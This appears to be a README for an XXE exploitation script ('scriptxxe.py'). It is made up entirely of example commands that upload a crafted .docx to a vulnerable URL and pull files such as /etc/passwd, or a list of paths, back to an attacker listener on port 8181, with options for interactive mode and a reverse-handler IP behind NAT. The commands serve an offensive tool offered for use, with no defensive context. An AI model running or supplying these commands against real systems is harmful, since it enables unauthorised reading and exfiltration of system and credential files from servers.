# legendary-train
## File paths
```
rlwrap python3 scriptxxe.py -u http://vulnURL -l X.X.X.X -p 8181 -t toto.docx -D 'name=toto&email=zob&submit=Submit Query' --paths-file one-path-per-line-file.txt
```
## File path in arg
```
rlwrap python3 scriptxxe.py -u http://vulnURL -l X.X.X.X -p 8181 -t toto.docx -D 'name=toto&email=zob&submit=Submit Query' -P /etc/passwd
```
## Interactive mode
```
rlwrap python3 scriptxxe.py -u http://vulnURL -l X.X.X.X -p 8181 -t toto.docx -D 'name=toto&email=zob&submit=Submit Query'
```
## Reverse Handler IP (for natted people)
```
rlwrap python3 scriptxxe.py -u http://vulnURL -l 0.0.0.0 -rl X.X.X.X -p 8181 -t toto.docx -D 'name=toto&email=zob&submit=Submit Query'
```
